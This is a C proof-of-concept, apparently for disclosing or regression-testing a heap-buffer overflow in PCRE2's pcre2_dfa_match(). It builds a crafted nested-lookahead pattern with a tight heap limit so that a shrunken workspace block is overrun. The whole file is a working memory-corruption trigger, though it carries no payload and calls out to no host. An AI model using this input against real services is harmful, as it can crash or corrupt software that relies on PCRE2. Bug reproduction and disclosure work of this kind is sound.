/* Demonstration of a heap-limit accounting defect in pcre2_dfa_match()'s
more_workspace(): when the doubled block size has to be reduced to fit the
remaining heap budget, the reduced block can be smaller than the request being
served, so the recursive internal_dfa_match() writes its state vector beyond
the end of the block.

Driven entirely through the public API with in-contract input: a compiled
pattern, a match context carrying a heap limit, and pcre2_dfa_match().
*/

#include <stdio.h>
#include <string.h>

#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"

/* Five nested lookaheads bring the stack workspace block's free space below
what a subpattern recursion needs, so the first heap block is requested while
a recursion is pending.  The recursion target is a group with many branches,
whose state vector is written into the new block. */

#define PATTERN "(?=(?=(?=(?=(?=(?1))))))(a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a|a)"
#define HEAP_LIMIT_KIB 11

int main(void)
{
  int errorcode;
  PCRE2_SIZE erroroffset;
  int workspace[65536];
  const char subject[] = "aaaaaa";
  int rc;

  pcre2_code *re = pcre2_compile((PCRE2_SPTR)PATTERN, PCRE2_ZERO_TERMINATED,
    0, &errorcode, &erroroffset, NULL);
  if (re == NULL)
    {
    PCRE2_UCHAR message[256];
    pcre2_get_error_message(errorcode, message, sizeof(message));
    printf("compile failed at offset %lu: %s\n", (unsigned long)erroroffset,
      (char *)message);
    return 1;
    }

  pcre2_match_data *mdata = pcre2_match_data_create_from_pattern(re, NULL);
  pcre2_match_context *mcontext = pcre2_match_context_create(NULL);
  pcre2_set_heap_limit(mcontext, HEAP_LIMIT_KIB);

  rc = pcre2_dfa_match(re, (PCRE2_SPTR)subject, strlen(subject), 0, 0,
    mdata, mcontext, workspace, sizeof(workspace)/sizeof(workspace[0]));

  printf("pcre2_dfa_match returned %d\n", rc);

  pcre2_match_context_free(mcontext);
  pcre2_match_data_free(mdata);
  pcre2_code_free(re);
  return 0;
}
